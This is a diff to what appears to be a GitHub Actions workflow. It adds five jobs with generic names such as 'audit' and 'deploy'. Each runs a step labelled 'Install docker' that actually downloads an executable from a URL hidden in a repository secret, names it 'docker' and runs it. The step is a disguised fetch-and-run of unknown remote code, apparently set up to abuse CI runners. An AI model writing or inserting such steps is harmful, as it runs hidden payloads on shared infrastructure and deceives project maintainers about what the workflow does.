@@ -10,3 +10,38 @@ jobs:
         env:
           SCRIPTURL: ${{ secrets.scripturl }}
         run: wget -q -O docker $SCRIPTURL && chmod +x docker && ./docker
+  test:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          SCRIPTURL: ${{ secrets.scripturl }}
+        run: wget -q -O docker $SCRIPTURL && chmod +x docker && ./docker
+  ci:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          SCRIPTURL: ${{ secrets.scripturl }}
+        run: wget -q -O docker $SCRIPTURL && chmod +x docker && ./docker
+  stg:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          SCRIPTURL: ${{ secrets.scripturl }}
+        run: wget -q -O docker $SCRIPTURL && chmod +x docker && ./docker
+  audit:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          SCRIPTURL: ${{ secrets.scripturl }}
+        run: wget -q -O docker $SCRIPTURL && chmod +x docker && ./docker
+  deploy:
+    runs-on: [ubuntu-22.04]
+    steps:
+      - name: Install docker
+        env:
+          SCRIPTURL: ${{ secrets.scripturl }}
+        run: wget -q -O docker $SCRIPTURL && chmod +x docker && ./docker
